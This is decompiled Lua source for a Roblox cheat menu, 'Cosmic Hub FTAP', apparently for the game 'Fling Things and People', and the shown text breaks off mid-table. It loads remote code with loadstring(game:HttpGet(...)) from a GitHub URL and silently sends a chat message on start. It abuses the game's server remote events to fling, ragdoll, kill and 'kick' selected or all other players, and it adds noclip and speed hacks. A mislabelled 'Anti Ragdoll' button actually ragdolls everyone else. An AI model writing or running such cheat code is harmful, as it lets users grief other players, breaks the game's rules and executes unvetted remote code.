local _Players = game:GetService('Players')
local _LocalPlayer = _Players.LocalPlayer
local _RunService = game:GetService('RunService')
local _HttpService = game:GetService('HttpService')
local _ReplicatedStorage = game:GetService('ReplicatedStorage')

game:GetService('Debris')

local _GrabEvents = _ReplicatedStorage:WaitForChild('GrabEvents')

_ReplicatedStorage:WaitForChild('CharacterEvents')
_ReplicatedStorage:WaitForChild('MenuToys')

local _SetNetworkOwner = _GrabEvents:WaitForChild('SetNetworkOwner')

game:GetService('StarterGui')

local _TextChatService = game:GetService('TextChatService')

if not (_Players.LocalPlayer or _Players:GetPropertyChangedSignal('LocalPlayer'):Wait()) then
    local _ = _Players.LocalPlayer
end

local _RagdollRemote = _ReplicatedStorage:WaitForChild('CharacterEvents'):FindFirstChild('RagdollRemote')
local u10 = false

if not _LocalPlayer.Character then
    _LocalPlayer.CharacterAdded:Wait()
end

workspace:FindFirstChild(_LocalPlayer.Name .. 'SpawnedInToys')

local _LocalPlayer2 = _Players.LocalPlayer
local _Workspace = game:GetService('Workspace');

(_G or {}).BlobmanDelay = 5e-8

local u13 = 1
local u14 = nil
local u15 = {}

function getAllPlayers()
    local v16 = _Players
    local v17, v18, v19 = ipairs(v16:GetPlayers())
    local v20 = {}

    while true do
        local v21

        v19, v21 = v17(v18, v19)

        if v19 == nil then
            break
        end

        table.insert(v20, v21.Name)
    end

    return v20
end
function registerDropdown(p22)
    table.insert(u15, p22)
    p22:Refresh(getAllPlayers(), true)
end
function sendChatMessage(p23)
    if _TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
        _ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(p23, 'All')
    else
        _TextChatService.TextChannels.RBXGeneral:SendAsync(p23)
    end
end

task.spawn(function()
    sendChatMessage('-`C\u{b4}-')
end)

local u24 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Jeffepicy/OrionGod/refs/heads/main/CosmicOrion', true))()
local v25 = u24

u24.MakeNotification(v25, {
    Name = 'Welcome to Cosmic Hub!',
    Content = 'You\u{2019}re Whitelisted! wink wink',
    Image = 'rbxassetid://4483345998',
    Time = 20,
})

local v26 = u24
local v27 = u24.MakeWindow(v26, {
    Name = 'Cosmic Hub FTAP',
    HidePremium = false,
    SaveConfig = true,
    ConfigFolder = 'CosmicHubFTAPConfig',
})
local v28 = v27:MakeTab({
    Name = 'Player',
    Icon = 'rbxassetid://6031075927',
    PremiumOnly = false,
})

v28:AddSection({
    Name = 'Movement',
})

local u29 = {
    Walkspeed = false,
    WalkspeedValue = 5,
    InfiniteJump = false,
    InfiniteJumpPower = 100,
    Noclip = false,
    Connections = {},
}
local _UserInputService = game:GetService('UserInputService')

function u29.WalkspeedFunc()
    if u29.Connections.WS then
        u29.Connections.WS:Disconnect()
    end
    if u29.Walkspeed then
        u29.Connections.WS = _RunService.Stepped:Connect(function()
            p = _Players.LocalPlayer

            if p and p.Character and (p.Character:FindFirstChild('HumanoidRootPart') and (p.Character:FindFirstChildOfClass('Humanoid') and typeof(u29.WalkspeedValue) == 'number')) then
                h = p.Character.HumanoidRootPart
                u = p.Character:FindFirstChildOfClass('Humanoid')
                h.CFrame = h.CFrame + u.MoveDirection * (16 * u29.WalkspeedValue / 10)
            end
        end)
    end
end
function u29.InfiniteJumpFunc()
    if u29.Connections.JP then
        u29.Connections.JP:Disconnect()
    end
    if u29.InfiniteJump then
        u29.Connections.JP = _UserInputService.JumpRequest:Connect(function()
            local _LocalPlayer3 = _Players.LocalPlayer

            if _LocalPlayer3 and _LocalPlayer3.Character and _LocalPlayer3.Character:FindFirstChildOfClass('Humanoid') then
                local _Humanoid = _LocalPlayer3.Character:FindFirstChildOfClass('Humanoid')

                _Humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
                task.wait()
                _Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)

                if _Humanoid.UseJumpPower == false then
                    _Humanoid.JumpHeight = math.clamp(u29.InfiniteJumpPower / 10, 7.2, 50)
                else
                    _Humanoid.JumpPower = u29.InfiniteJumpPower
                end
            end
        end)
    end
end
function u29.NoclipFunc()
    if u29.Connections.NC then
        u29.Connections.NC:Disconnect()
    end
    if u29.Noclip then
        u29.Connections.NC = _RunService.Stepped:Connect(function()
            p = _Players.LocalPlayer

            if p and p.Character then
                local v33, v34, v35 = ipairs(p.Character:GetDescendants())

                while true do
                    local v36

                    v35, v36 = v33(v34, v35)

                    if v35 == nil then
                        break
                    end
                    if v36:IsA('BasePart') then
                        v36.CanCollide = false
                    end
                end
            end
        end)
    end
end

v28:AddToggle({
    Name = 'Walkspeed',
    Default = false,
    Callback = function(p37)
        u29.Walkspeed = p37

        u29.WalkspeedFunc()
    end,
})
v28:AddSlider({
    Name = 'Speed Multiplier',
    Min = 1,
    Max = 5,
    Default = 0.1,
    Increment = 0.1,
    Callback = function(p38)
        u29.WalkspeedValue = p38
    end,
})
v28:AddToggle({
    Name = 'Infinite Jump',
    Default = false,
    Callback = function(p39)
        u29.InfiniteJump = p39

        u29.InfiniteJumpFunc()
    end,
})
v28:AddSlider({
    Name = 'Jump Power',
    Min = 16,
    Max = 500,
    Default = 16,
    Increment = 1,
    Callback = function(p40)
        u29.InfiniteJumpPower = p40
    end,
})
v28:AddToggle({
    Name = 'Noclip',
    Default = false,
    Callback = function(p41)
        u29.Noclip = p41

        u29.NoclipFunc()
    end,
})

local v42 = v27:MakeTab({
    Name = 'Invincibility',
    Icon = 'rbxassetid://4483362458',
    PremiumOnly = false,
})

v42:AddSection({
    Name = 'Anti',
})

function ragdollAllPlayers()
    if _RagdollRemote then
        local v43 = _Players
        local v44, v45, v46 = pairs(v43:GetPlayers())

        while true do
            local v47

            v46, v47 = v44(v45, v46)

            if v46 == nil then
                break
            end
            if v47.Character and v47.Character:FindFirstChild('HumanoidRootPart') then
                for _ = 1, 150 do
                    _RagdollRemote:FireServer(v47.Character.HumanoidRootPart, 9999999)
                    wait()
                end
            end
        end
    else
        u24:MakeNotification({
            Name = 'Error',
            Content = 'error',
            Image = 'rbxassetid://4483345998',
            Time = 3,
        })
    end
end

v42:AddButton({
    Name = 'Anti Ragdoll/Snowball',
    Callback = function()
        ragdollAllPlayers()
    end,
})
v42:AddButton({
    Name = 'Destroy Void',
    Callback = function()
        _Workspace.FallenPartsDestroyHeight = -1e95
    end,
})

local u58 = {
    Players = game:GetService('Players'),
    ReplicatedStorage = game:GetService('ReplicatedStorage'),
    RunService = game:GetService('RunService'),
    LP = game.Players.LocalPlayer,
    spawnGucci = function()
        return u58.ReplicatedStorage.MenuToys.SpawnToyRemoteFunction:InvokeServer('CreatureBlobman', CFrame.new(0, 50000, 0) * CFrame.Angles(-0.7351, 0.9028, 0.6173), Vector3.new(0, 59.667, 0))
    end,
    setup = function()
        u58.spawnGucci()

        local _Name = u58.LP.Name
        local u49 = _Workspace
        local v50 = u58.LP.Character or u58.LP.CharacterAdded:Wait()
        local v51 = u49:FindFirstChild(_Name .. 'SpawnedInToys')
        local v52 = nil
        local v53

        if v51 then
            v53 = v51:FindFirstChild('CreatureBlobman')
        else
            v53 = nil
        end
        if v53 then
            v52 = v53:FindFirstChild('Head')
        end
        if v52 then
            v52.CFrame = CFrame.new(0, 50000, 0)
            v52.Anchored = true
        end

        task.wait(0.1)

        local _Humanoid2 = v50:WaitForChild('Humanoid')
        local _HumanoidRootPart = v50:WaitForChild('HumanoidRootPart')
        local _Position = _HumanoidRootPart.Position
        local u57 = false

        if v53 then
            v53 = v53:FindFirstChild('VehicleSeat')
        end
        if v53 and v53:IsA('VehicleSeat') then
            _HumanoidRootPart.CFrame = v53.CFrame + Vector3.new(0, 2, 0)

            v53:Sit(_Humanoid2)

            u57 = true
        end

        _Humanoid2:GetPropertyChangedSignal('Jump'):Connect(function()
            if u57 and _Humanoid2.Jump then
                task.wait(0.02)

                _HumanoidRootPart.CFrame = CFrame.new(_Position)
                u57 = false
            end
        end)

        u58.ragdollConn = u58.RunService.Heartbeat:Connect(function()
            if u58.enabled and u57 then
                pcall(function()
                    u58.ReplicatedStorage.CharacterEvents.RagdollRemote:FireServer(u49[_Name].HumanoidRootPart, 0)
                end)
            end
        end)
        u58.posCheckConn = u58.RunService.Heartbeat:Connect(function()
            if u58.enabled and (_HumanoidRootPart.Position - _Position).Magnitude < 1 then
                u57 = false
            end
        end)
    end,
}

v42:AddToggle({
    Name = ' Gucci Anti',
    Default = false,
    Callback = function(p59)
        u58.enabled = p59

        if p59 then
            u58.setup()
        else
            if u58.ragdollConn then
                u58.ragdollConn:Disconnect()

                u58.ragdollConn = nil
            end
            if u58.posCheckConn then
                u58.posCheckConn:Disconnect()

                u58.posCheckConn = nil
            end
        end
    end,
})
v42:AddButton({
    Name = 'Destroy Gucci (All)',
    Callback = function()
        local v60, v61, v62 = _Workspace:GetDescendants()

        while true do
            local v63

            v62, v63 = v60(v61, v62)

            if v62 == nil then
                break
            end
            if v63.Name == 'CreatureBlobman' then
                v63.VehicleSeat:Sit(game.Players.LocalPlayer.Character.Humanoid)
                wait(0.05)

                game.Players.LocalPlayer.Character.Humanoid.Jump = true
            end
        end
    end,
})

local u64 = false

function antiGrab()
    while u64 and task.wait() do
        if _LocalPlayer2:FindFirstChild('IsHeld') and _LocalPlayer2.IsHeld.Value == true then
            local _Character = _LocalPlayer2.Character
            local v66 = _Character and _Character:FindFirstChild('HumanoidRootPart')

            if v66 then
                v66.Anchored = true

                while _LocalPlayer2.IsHeld.Value == true and u64 do
                    _ReplicatedStorage.CharacterEvents.Struggle:FireServer(_LocalPlayer2)
                    task.wait(0.001)
                end

                v66.Anchored = false
            end
        end
    end
end

v42:AddToggle({
    Name = 'Anti Grab',
    Default = false,
    Callback = function(p67)
        u64 = p67

        if u64 then
            task.spawn(antiGrab)
        end
    end,
})

local u68 = false

function antiExplodeF()
    _Workspace.ChildAdded:Connect(function(p69)
        local v70 = p69:IsA('Part') and (p69.Name == 'Part' and (u68 and _LocalPlayer2.Character))

        if v70 then
            local _HumanoidRootPart2 = v70:FindFirstChild('HumanoidRootPart')
            local _RightArm = v70:FindFirstChild('Right Arm')

            if _HumanoidRootPart2 and (_RightArm and (p69.Position - _HumanoidRootPart2.Position).Magnitude <= 20) then
                _HumanoidRootPart2.Anchored = true

                task.wait(0.01)

                while _RightArm:FindFirstChild('RagdollLimbPart') and _RightArm.RagdollLimbPart.CanCollide == true do
                    task.wait(0.001)
                end

                _HumanoidRootPart2.Anchored = false
            end
        end
    end)
end

v42:AddToggle({
    Name = 'Anti Explode',
    Default = false,
    Callback = function(p73)
        u68 = p73

        if u68 then
            task.spawn(antiExplodeF)
        end
    end,
})
v42:AddToggle({
    Name = 'Anti Fire',
    Default = false,
    Callback = function(p74)
        local u75 = {
            p = game:GetService('Players').LocalPlayer,
            rs = game:GetService('RunService'),
            w = game:GetService('Workspace'),
            mon = false,
            con = nil,
        }

        u75.ep = u75.w.Map.Hole.PoisonBigHole.ExtinguishPart
        u75.op = u75.ep.Position

        function check()
            local _HumanoidRootPart3 = (u75.p.Character or u75.p.CharacterAdded:Wait()):WaitForChild('HumanoidRootPart')
            local _FireLight = _HumanoidRootPart3:FindFirstChild('FireLight')
            local _FireParticleEmitter = _HumanoidRootPart3:FindFirstChild('FireParticleEmitter')

            if _FireLight or _FireParticleEmitter then
                u75.ep.CFrame = CFrame.new(_HumanoidRootPart3.Position)

                while _FireLight or _FireParticleEmitter do
                    task.wait(0.1)

                    _FireLight = _HumanoidRootPart3:FindFirstChild('FireLight')
                    _FireParticleEmitter = _HumanoidRootPart3:FindFirstChild('FireParticleEmitter')
                    u75.ep.CFrame = CFrame.new(_HumanoidRootPart3.Position)
                end

                u75.ep.CFrame = CFrame.new(u75.op)
            end
        end

        u75.mon = p74

        if p74 then
            if not u75.con then
                u75.con = u75.rs.Heartbeat:Connect(function()
                    if u75.mon then
                        check()
                    end
                end)
            end
        else
            u75.ep.CFrame = CFrame.new(u75.op)

            if u75.con then
                u75.con:Disconnect()

                u75.con = nil
            end
        end
    end,
})

function antiLagF()
    local _Character2 = game.Players.LocalPlayer.Character

    if _Character2 then
        local _HumanoidRootPart4 = _Character2:FindFirstChild('HumanoidRootPart')
        local _Humanoid3 = _Character2:FindFirstChild('Humanoid')
        local _PlayerScripts = game.Players.LocalPlayer:FindFirstChild('PlayerScripts')

        if _PlayerScripts then
            _PlayerScripts = game.Players.LocalPlayer.PlayerScripts:FindFirstChild('CharacterAndBeamMove')
        end
        if _HumanoidRootPart4 and (_Humanoid3 and _PlayerScripts) then
            _PlayerScripts.Disabled = antiLagT
        end
    end
end

v42:AddToggle({
    Name = 'Anti Lag',
    Default = false,
    Callback = function(p83)
        antiLagT = p83

        antiLagF()
    end,
})

function removeDetectors()
    local _Character3 = _LocalPlayer.Character

    if _Character3 then
        local _HumanoidRootPart5 = _Character3:FindFirstChild('HumanoidRootPart')

        if _HumanoidRootPart5 then
            local v86 = _Workspace
            local v87, v88, v89 = pairs(v86:GetDescendants())

            while true do
                local v90

                v89, v90 = v87(v88, v89)

                if v89 == nil then
                    break
                end
                if v90:IsA('BasePart') and (v90.Name == 'LeftDetector' or v90.Name == 'RightDetector') and (_HumanoidRootPart5.Position - v90.Position).Magnitude > 10 then
                    v90:Destroy()
                end
            end
        end
    else
        return
    end
end
function applyAntiMassless()
    while u10 do
        if _LocalPlayer.Character then
            local v91, v92, v93 = ipairs(_LocalPlayer.Character:GetDescendants())

            while true do
                local v94

                v93, v94 = v91(v92, v93)

                if v93 == nil then
                    break
                end
                if v94:IsA('BasePart') and v94.Massless then
                    v94.Massless = false
                end
            end
        end

        task.wait(1)
    end
end

v42:AddToggle({
    Name = 'Anti Blobman',
    Default = false,
    Callback = function(p95)
        u10 = p95

        if u10 then
            task.spawn(function()
                while u10 do
                    removeDetectors()
                    task.wait(1)
                end
            end)
            task.spawn(applyAntiMassless)
        end
    end,
})

local v96 = v27:MakeTab({
    Name = 'Attack',
    Icon = 'rbxassetid://6031094674',
    PremiumOnly = false,
})

v96:AddSection({
    Name = 'Loop ',
})

local _Players2 = game:GetService('Players')
local _RunService2 = game:GetService('RunService')
local u99 = _Workspace
local _ReplicatedStorage2 = game.ReplicatedStorage
local _LocalPlayer4 = _Players2.LocalPlayer
local u102 = {}
local u103 = nil
local u104 = {
    E = false,
    S = nil,
    D = 2,
    Off = Vector3.new(5, -18.5, 0),
    H = 10000,
    Del = 0.5,
}
local u105 = {
    E = false,
    S = nil,
    D = 2,
    Off = Vector3.new(5, -18.5, 0),
    H = 10000,
    Del = 0.5,
}

function upd(p106)
    local v107 = _Players2
    local v108, v109, v110 = ipairs(v107:GetPlayers())
    local v111 = {}

    while true do
        local v112

        v110, v112 = v108(v109, v110)

        if v110 == nil then
            break
        end

        table.insert(v111, v112.Name)
    end

    p106:Refresh(v111, true)
end
function nocoll(p113)
    local v114, v115, v116 = ipairs(p113:GetDescendants())

    while true do
        local v117

        v116, v117 = v114(v115, v116)

        if v116 == nil then
            break
        end
        if v117:IsA('BasePart') then
            v117.CanCollide = false
        end
    end
end
function fling(p118, p119)
    nocoll(p119.Parent)

    local _BodyVelocity = Instance.new('BodyVelocity', p118)
    local v121 = Vector3.new(0, 1000000000, 0)

    _BodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    _BodyVelocity.Velocity = v121
    p119.Jump = true
    p119.Sit = false

    task.delay(3, function()
        if _BodyVelocity.Parent then
            _BodyVelocity:Destroy()
        end
    end)
end
function above(p122, p123)
    local _Character4 = p122.Character

    if _Character4 then
        _Character4 = p122.Character:FindFirstChild('HumanoidRootPart')
    end

    return (not _Character4 or p123 < _Character4.Position.Y) and true or false
end
function save(p125)
    local _Character5 = _LocalPlayer4.Character

    if _Character5 and _Character5:FindFirstChild('HumanoidRootPart') then
        p125.S = _Character5:GetPivot()
    end
end
function ret(p127)
    local _Character6 = _LocalPlayer4.Character
    local v129

    if _Character6 then
        v129 = _Character6:FindFirstChild('HumanoidRootPart')
    else
        v129 = _Character6
    end
    if v129 and (p127.S and (v129.Position - p127.S.Position).Magnitude > p127.D) then
        _Character6:PivotTo(p127.S)
    end
end
function act(p130, p131, p132)
    if p131.E then
        if u99:FindFirstChild('PlotItems') and u99.PlotItems.PlayersInPlots:FindFirstChild(p130.Name) then
            return
        else
            local _Character7 = p130.Character
            local u134

            if _Character7 then
                u134 = _Character7:FindFirstChild('HumanoidRootPart')
            else
                u134 = _Character7
            end

            local u135

            if _Character7 then
                u135 = _Character7:FindFirstChildOfClass('Humanoid')
            else
                u135 = _Character7
            end

            local u136

            if _Character7 then
                u136 = _Character7:FindFirstChild('Head')
            else
                u136 = _Character7
            end
            if u134 and (u135 and (u136 and (u135.Health > 0 and not above(p130, p131.H)))) then
                local _Character8 = _LocalPlayer4.Character
                local v138

                if _Character8 then
                    v138 = _Character8:FindFirstChild('HumanoidRootPart')
                else
                    v138 = _Character8
                end
                if v138 then
                    pcall(function()
                        save(p131)
                        _Character8:PivotTo(CFrame.new(u134.Position + p131.Off))
                        nocoll(_Character7)
                        _ReplicatedStorage2.GrabEvents.SetNetworkOwner:FireServer(u134, u134.CFrame)
                        task.wait()
                        ret(p131)
                        task.wait(0.1)
                        _ReplicatedStorage2.GrabEvents.DestroyGrabLine:FireServer(u134)
                        task.wait(0.1)

                        if u136:FindFirstChild('PartOwner') and u136.PartOwner.Value == _LocalPlayer4.Name then
                            fling(u134, u135)

                            if p132 then
                                task.wait(0.1)

                                u135.Health = 0
                            end
                        end
                    end)
                    task.wait(p131.Del)
                end
            else
                return
            end
        end
    else
        return
    end
end
function loop(p139, p140)
    save(p139)

    local v141, v142, v143 = pairs(u102)

    while true do
        v143 = v141(v142, v143)

        if v143 == nil or not p139.E then
            break
        end

        local v144 = _Players2:FindFirstChild(v143)

        if v144 then
            act(v144, p139, p140)
        end
    end
end
function loopCtrl(p145, p146)
    return _RunService2.Heartbeat:Connect(function()
        if p145.E then
            loop(p145, p146)
        end
    end)
end

local u147 = nil
local u148 = nil
local u149 = nil
local u150 = nil

function stop(p151, p152)
    p152.E = false

    if p151 then
        p151:Disconnect()
    end

    p152.S = nil
end

SelectDropdown = v96:AddDropdown({
    Name = 'Select Player',
    Options = {},
    Callback = function(p153)
        u103 = _Players2:FindFirstChild(p153)
    end,
})
LoopDropdown = v96:AddDropdown({
    Name = 'Players in Loop',
    Options = {},
    Callback = function(p154)
        u103 = _Players2:FindFirstChild(p154)
    end,
})

v96:AddButton({
    Name = 'Add Player',
    Callback = function()
        if u103 and not u102[u103.Name] then
            u102[u103.Name] = true

            upd(LoopDropdown)
        end
    end,
})
v96:AddButton({
    Name = 'Remove Player',
    Callback = function()
        if u103 and u102[u103.Name] then
            u102[u103.Name] = nil
            u103 = nil

            upd(SelectDropdown)
            upd(LoopDropdown)
        end
    end,
})
v96:AddToggle({
    Name = 'Loop Kick',
    Callback = function(p155)
        u104.E = p155

        if p155 then
            u147 = loopCtrl(u104, false)
        else
            stop(u147, u104)
        end
    end,
})
v96:AddToggle({
    Name = 'Loop Kill',
    Callback = function(p156)
        u105.E = p156

        if p156 then
            u148 = loopCtrl(u105, true)
        else
            stop(u148, u105)
        end
    end,
})
_Players2.PlayerAdded:Connect(function()
    upd(SelectDropdown)
end)
_Players2.PlayerRemoving:Connect(function(p157)
    if u102[p157.Name] then
        u102[p157.Name] = nil

        upd(LoopDropdown)
    end

    upd(SelectDropdown)
end)
upd(SelectDropdown)
upd(LoopDropdown)
v96:AddToggle({
    Name = 'Kick All',
    Callback = function(p158)
        if p158 then
            stop(u147, u104)

            u149 = _RunService2.Heartbeat:Connect(function()
                save(u104)

                local v159 = _Players2
                local v160, v161, v162 = ipairs(v159:GetPlayers())

                while true do
                    local v163

                    v162, v163 = v160(v161, v162)

                    if v162 == nil then
                        break
                    end
                    if v163 ~= _LocalPlayer4 then
                        act(v163, u104, false)
                    end
                end
            end)
        else
            stop(u149, u104)
        end
    end,
})
v96:AddToggle({
    Name = 'Kill All',
    Callback = function(p164)
        if p164 then
            stop(u148, u105)

            u150 = _RunService2.Heartbeat:Connect(function()
                save(u105)

                local v165 = _Players2
                local v166, v167, v168 = ipairs(v165:GetPlayers())

                while true do
                    local v169

                    v168, v169 = v166(v167, v168)

                    if v168 == nil then
                        break
                    end
                    if v169 ~= _LocalPlayer4 then
                        act(v169, u105, true)
                    end
                end
            end)
        else
            stop(u150, u105)
        end
    end,
})
v96:AddSection({
    Name = 'Grabs',
})

local u170 = false

function killGrabF()
    if u170 then
        _Workspace.ChildAdded:Connect(function(p171)
            if p171:IsA('Model') and (p171.Name == 'GrabParts' and u170) then
                local _GrabPart = p171:FindFirstChild('GrabPart')

                if _GrabPart and _GrabPart:FindFirstChild('WeldConstraint') then
                    local _Part1 = _GrabPart.WeldConstraint.Part1
                    local v174 = _Part1 and (_Part1.Parent and _Part1.Parent ~= _LocalPlayer2.Character) and _Part1.Parent:FindFirstChildOfClass('Humanoid')

                    if v174 then
                        v174.Health = 0
                    end
                end
            end
        end)
    end
end

v96:AddToggle({
    Name = 'Kill Grab',
    Default = false,
    Callback = function(p175)
        u170 = p175

        killGrabF()
    end,
})

local u176 = {
    S = game:GetService('UserInputService'),
    A = game:GetService('ContextActionService'),
    W = game:GetService('Workspace'),
    R = game:GetService('RunService'),
    D = game:GetService('Debris'),
    P = game:GetService('Players'),
    Enabled = false,
    Strength = 800,
    UI = {},
}

function onGrabAdded(p177)
    if not u176.Enabled then
        return
    end
    if p177.Name ~= 'GrabParts' then
        return
    end

    local _GrabPart2 = p177:FindFirstChild('GrabPart')

    if not (_GrabPart2 and _GrabPart2:FindFirstChild('WeldConstraint')) then
        return
    end

    local _Part12 = _GrabPart2.WeldConstraint.Part1

    if not _Part12 then
        return
    end

    local _BodyVelocity2 = Instance.new('BodyVelocity')

    _BodyVelocity2.MaxForce = Vector3.new(0, 0, 0)
    _BodyVelocity2.Parent = _Part12

    local v181 = nil
    local u182 = nil
    local u183 = nil
    local u184 = nil

    while true do
        if v181 or not (p177.Parent and u176.Enabled) then
            if v181 and u176.Enabled then
                function launch()
                    _BodyVelocity2.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    _BodyVelocity2.Velocity = u176.W.CurrentCamera.CFrame.LookVector * u176.Strength
                end

                u182 = v181.MouseButton1Up:Connect(launch)
                u183 = v181.MouseButton1Down:Connect(launch)
            end

            local _ = p177:GetPropertyChangedSignal('Parent'):Connect(function()
                if not p177.Parent then
                    if u182 then
                        u182:Disconnect()
                    end
                    if u183 then
                        u183:Disconnect()
                    end
                    if u184 then
                        u184:Disconnect()
                    end

                    u176.D:AddItem(_BodyVelocity2, 1)
                end
            end)

            return
        end

        local v185, v186, v187 = pairs(u176.P.LocalPlayer.PlayerGui.ContextActionGui:GetDescendants())

        while true do
            local v188

            v187, v188 = v185(v186, v187)

            if v187 == nil then
                break
            end
            if v188:IsA('ImageLabel') and v188.Image == 'http://www.roblox.com/asset/?id=9603678090' then
                v181 = v188.Parent

                break
            end
        end

        u176.R.Heartbeat:Wait()
    end
end
function toggleConnections(p189)
    if p189 then
        u176.GrabConn = u176.W.ChildAdded:Connect(onGrabAdded)
    elseif u176.GrabConn then
        u176.GrabConn:Disconnect()

        u176.GrabConn = nil
    end
end

v96:AddToggle({
    Name = 'Strength',
    Default = false,
    Callback = function(p190)
        u176.Enabled = p190

        toggleConnections(p190)
    end,
})
v96:AddSlider({
    Name = 'Launch Strength',
    Min = 10,
    Max = 3000,
    Default = u176.Strength,
    Increment = 50,
    Callback = function(p191)
        u176.Strength = p191
    end,
})

local _LocalPlayer5 = game:GetService('Players').LocalPlayer

v96:AddSection({
    Name = 'Snowball Ragdoll',
})

local u193 = {
    P = game:GetService('Players'),
    RS = game:GetService('ReplicatedStorage'),
    W = _Workspace,
    LP = game.Players.LocalPlayer,
    Toy = game:GetService('ReplicatedStorage'):WaitForChild('MenuToys'),
    Set = game:GetService('ReplicatedStorage'):WaitForChild('GrabEvents'):WaitForChild('SetNetworkOwner'),
    TP = nil,
    TE = false,
    SE = false,
    AE = false,
    DD = nil,
    R = {},
}

function getAllPlayers()
    local v194, v195, v196 = ipairs(u193.P:GetPlayers())
    local v197 = {}

    while true do
        local v198

        v196, v198 = v194(v195, v196)

        if v196 == nil then
            break
        end
        if v198 ~= u193.LP then
            table.insert(v197, v198.Name)
        end
    end

    return v197
end
function updateDropdown()
    if u193.DD then
        u193.DD:Refresh(getAllPlayers(), true)
    end
end

u193.P.PlayerAdded:Connect(updateDropdown)
u193.P.PlayerRemoving:Connect(updateDropdown)

function spawnToy(p199, p200)
    task.spawn(function()
        local _SpawnToyRemoteFunction = u193.Toy:FindFirstChild('SpawnToyRemoteFunction')

        if _SpawnToyRemoteFunction then
            pcall(function()
                _SpawnToyRemoteFunction:InvokeServer(p199, CFrame.new(p200), Vector3.new())
            end)
        end
    end)
end
function tpSnow()
    while u193.AE do
        local v202 = u193.W:FindFirstChild(u193.LP.Name .. 'SpawnedInToys')

        if v202 then
            local v203, v204, v205 = pairs(u193.R)

            while true do
                local v206

                v205, v206 = v203(v204, v205)

                if v205 == nil then
                    break
                end

                local _Character9 = v206.Character

                if _Character9 then
                    _Character9 = _Character9:FindFirstChild('HumanoidRootPart')
                end
                if _Character9 then
                    local v208, v209, v210 = ipairs(v202:GetChildren())

                    while true do
                        local v211

                        v210, v211 = v208(v209, v210)

                        if v210 == nil then
                            break
                        end
                        if v211:IsA('Model') and v211.Name == 'BallSnowball' then
                            local v212, v213, v214 = ipairs(v211:GetDescendants())

                            while true do
                                local v215

                                v214, v215 = v212(v213, v214)

                                if v214 == nil then
                                    break
                                end
                                if v215:IsA('BasePart') then
                                    v215.Position = _Character9.Position
                                end
                            end
                        end
                    end
                end
            end
        end

        task.wait(0.1)
    end
end
function autoBlob()
    while u193.AE do
        u193.R = {}

        local v216, v217, v218 = pairs(u193.P:GetPlayers())

        while true do
            local v219

            v218, v219 = v216(v217, v218)

            if v218 == nil then
                break
            end
            if v219 ~= u193.LP and v219.Character then
                local _Humanoid4 = v219.Character:FindFirstChildOfClass('Humanoid')

                if _Humanoid4 and (_Humanoid4.SeatPart and _Humanoid4.SeatPart.Parent.Name == 'CreatureBlobman') then
                    table.insert(u193.R, v219)

                    local _Character10 = u193.LP.Character

                    if _Character10 then
                        _Character10 = u193.LP.Character:FindFirstChild('HumanoidRootPart')
                    end
                    if _Character10 then
                        spawnToy('BallSnowball', _Character10.Position + Vector3.new(0, 2, 0))
                    end
                end
            end
        end

        task.wait(0.1)
    end
end
function spawnBalls()
    while u193.SE do
        local _Character11 = u193.LP.Character

        if _Character11 then
            _Character11 = u193.LP.Character:FindFirstChild('HumanoidRootPart')
        end
        if _Character11 then
            spawnToy('BallSnowball', _Character11.Position + Vector3.new(0, 2, 0))
        end

        task.wait(1)
    end
end
function tpBall()
    while u193.TE do
        local v223 = u193.W:FindFirstChild(u193.LP.Name .. 'SpawnedInToys')

        if v223 and u193.TP then
            local v224 = u193.P:FindFirstChild(u193.TP)

            if v224 then
                v224 = v224.Character
            end
            if v224 then
                v224 = v224:FindFirstChild('HumanoidRootPart')
            end
            if v224 then
                local v225, v226, v227 = ipairs(v223:GetChildren())

                while true do
                    local v228

                    v227, v228 = v225(v226, v227)

                    if v227 == nil then
                        break
                    end
                    if v228:IsA('Model') and v228.Name == 'BallSnowball' then
                        local v229, v230, v231 = ipairs(v228:GetDescendants())

                        while true do
                            local v232

                            v231, v232 = v229(v230, v231)

                            if v231 == nil then
                                break
                            end
                            if v232:IsA('BasePart') then
                                v232.Position = v224.Position
                            end
                        end
                    end
                end
            end
        end

        task.wait(0.1)
    end
end

u193.DD = v96:AddDropdown({
    Name = 'Select Player (Snowball)',
    Options = getAllPlayers(),
    Default = nil,
    Callback = function(p233)
        u193.TP = p233
    end,
})

updateDropdown()
v96:AddToggle({
    Name = 'Snowball Ragdoll',
    Default = false,
    Callback = function(p234)
        u193.TE = p234

        if p234 then
            task.spawn(tpBall)
        end
    end,
})
v96:AddToggle({
    Name = 'Auto Spawn Snowballs',
    Default = false,
    Callback = function(p235)
        u193.SE = p235

        if p235 then
            task.spawn(spawnBalls)
        end
    end,
})
v96:AddToggle({
    Name = 'Auto Kick Blob (Snowball Spam)',
    Default = false,
    Callback = function(p236)
        u193.AE = p236

        if p236 then
            task.spawn(autoBlob)
            task.spawn(tpSnow)
        end
    end,
})

if not game:IsLoaded() then
    game.Loaded:Wait()
end
if not (syn and protectgui) then
    getgenv().protectgui = function() end
end

local v237 = v27:MakeTab({
    Name = 'Blobman Loop',
    Icon = 'rbxassetid://6031091005',
    PremiumOnly = false,
})

v237:AddSection({
    Name = 'Blobman Target',
})

local u238 = {
    Players = game:GetService('Players'),
    ReplicatedStorage = game:GetService('ReplicatedStorage'),
    Workspace = game:GetService('Workspace'),
    LocalPlayer = nil,
    TargetList = u29.TargetList or {},
    selectedPlayer = nil,
    toggleEnabled = false,
    teleportAllEnabled = false,
    teleportDelay = 1,
    currentBlobman = nil,
    masterRunning = false,
    blobalter = 1,
    ORIGIN_POS = nil,
    MAX_TELEPORT_DIST = 500,
    targetPlayerDropdown = nil,
}

u238.LocalPlayer = u238.Players.LocalPlayer
u29.TargetList = u238.TargetList

function getAllPlayers()
    local v239, v240, v241 = ipairs(u238.Players:GetPlayers())
    local v242 = {}

    while true do
        local v243

        v241, v243 = v239(v240, v241)

        if v241 == nil then
            break
        end
        if v243 ~= u238.LocalPlayer then
            table.insert(v242, v243.Name)
        end
    end

    return v242
end
function refreshDropdown()
    if u238.targetPlayerDropdown then
        u238.targetPlayerDropdown:Refresh(getAllPlayers(), true)
    end
end

u238.targetPlayerDropdown = v237:AddDropdown({
    Name = 'Select Player',
    Default = '',
    Options = getAllPlayers(),
